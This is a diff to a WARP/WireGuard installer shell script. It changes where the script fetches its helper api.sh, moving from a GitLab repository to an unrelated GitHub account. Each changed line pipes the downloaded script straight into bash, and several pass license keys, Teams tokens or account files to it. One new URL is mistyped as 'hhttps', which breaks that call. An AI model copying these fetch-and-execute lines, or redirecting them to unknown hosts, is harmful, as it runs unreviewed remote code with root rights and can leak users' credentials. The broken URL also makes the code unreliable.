@@ -527,7 +527,7 @@ check_dependencies() {
 cancel_account(){
   local FILE=$1
   if [ -s "$FILE" ]; then
-    grep -oqE '"id":[ ]+"t.[A-F0-9a-f]{8}-' $FILE || bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --cancle --file $FILE >/dev/null 2>&1
+    grep -oqE '"id":[ ]+"t.[A-F0-9a-f]{8}-' $FILE || bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --cancle --file $FILE >/dev/null 2>&1
   fi
 }
 
@@ -844,11 +844,11 @@ change_ip() {
       wg-quick down warp >/dev/null 2>&1
       [ -s /etc/wireguard/info.log ] && grep -q 'Device name' /etc/wireguard/info.log && local LICENSE=$(cat /etc/wireguard/license) && local NAME=$(awk '/Device name/{print $NF}' /etc/wireguard/info.log)
       cancel_account /etc/wireguard/warp-account.conf
-      bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
+      bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
       # 如原来是 plus 账户，以相同的 license 升级，并修改账户和 warp 配置文件
       if [[ -n "$LICENSE" && -n "$NAME" ]]; then
-        [ -n "$LICENSE" ] && bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE >/dev/null 2>&1
-        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+        [ -n "$LICENSE" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE >/dev/null 2>&1
+        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
         local PRIVATEKEY="$(grep 'private_key' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
         local ADDRESS6="$(grep '"v6.*"$' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
         local CLIENT_ID="$(reserved_and_clientid /etc/wireguard/warp-account.conf file)"
@@ -1603,7 +1603,7 @@ input_url_token() {
       [ -z "$TEAM_TOKEN" ] && return
 
       unset TEAMS ADDRESS6 PRIVATEKEY CLIENT_ID
-      TEAMS=$(bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's# > $register_path##; /cat $register_path/d') --register --token $TEAM_TOKEN)
+      TEAMS=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh | sed 's# > $register_path##; /cat $register_path/d') --register --token $TEAM_TOKEN)
       ADDRESS6=$(expr "$TEAMS" : '.*"v6":[ ]*"\([^"]*\).*')
       PRIVATEKEY=$(expr "$TEAMS" : '.*"private_key":[ ]*"\([^"]*\).*')
       RESERVED=$(expr "$TEAMS" : '.*"client_id":[ ]*"\([^"]*\).*')
@@ -1971,13 +1971,13 @@ install() {
 
     # 注册 WARP 账户 ( warp-account.conf 使用默认值加快速度)。如有 WARP+ 账户，修改 license 并升级，并把设备名等信息保存到 /etc/wireguard/info.log
     mkdir -p /etc/wireguard/ >/dev/null 2>&1
-    bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
+    bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
 
     # 有 License 来升级账户
     if [ -n "$LICENSE" ]; then
-      local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
+      local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
       if grep -q '"warp_plus": true' <<< "$UPDATE_RESULT"; then
-        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
         sed -i "s#\([ ]\+\"license\": \"\).*#\1$LICENSE\"#g; s#\"account_type\".*#\"account_type\": \"limited\",#g; s#\([ ]\+\"name\": \"\).*#\1$NAME\"#g" /etc/wireguard/warp-account.conf
         echo "$LICENSE" > /etc/wireguard/license
         echo -e "Device name   : $NAME" > /etc/wireguard/info.log
@@ -2491,7 +2491,7 @@ check_quota() {
   if [ "$CHECK_TYPE" = 'client' ]; then
     QUOTA=$(warp-cli --accept-tos registration show 2>/dev/null | awk -F' ' '/Quota/{print $NF}')
   elif [ -e /etc/wireguard/warp-account.conf ]; then
-    QUOTA=$(bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --device | awk '/quota/{print $NF}' | sed "s#,##")
+    QUOTA=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --file /etc/wireguard/warp-account.conf --device | awk '/quota/{print $NF}' | sed "s#,##")
   fi
 
   # 部分系统没有依赖 bc，所以两个小数不能用 $(echo "scale=2; $QUOTA/1000000000000000" | bc)，改为从右往左数字符数的方法
@@ -2611,7 +2611,7 @@ change_to_free() {
     esac
 
     # 流程3:注册新账户
-    bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
+    bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
 
     # 流程4:如成功，根据新账户信息修改配置文件并注销旧账户; 如失败则还原为原账户
     # 如升级成功的处理: 删除原账户信息文件，注销原账户
@@ -2726,15 +2726,15 @@ change_to_plus() {
     esac
 
     # 流程3:注册新账户
-    bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
+    bash <(curl -m5 -sSL hhttps://raw.githubusercontent.com/zidnyzd/linux/main/api.sh | sed 's#cat $register_path; ##') --register --file /etc/wireguard/warp-account.conf 2>/dev/null
 
     # 流程4:使用 License 升级账户
-    local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
+    local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
 
     # 流程5:如成功，根据新账户信息修改配置文件并注销旧账户; 如失败则还原为原账户
     # 如升级成功的处理: 删除原账户信息文件，注销原账户
     if grep -q '"warp_plus": true' <<< "$UPDATE_RESULT"; then
-      [ -n "$NAME" ] && bash <(curl -m5 -sSL https://gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+      [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/zidnyzd/linux/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
       cancel_account /etc/wireguard/warp-account.conf.bak
       backup_restore_delete delete
       local PRIVATEKEY="$(grep 'private_key' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
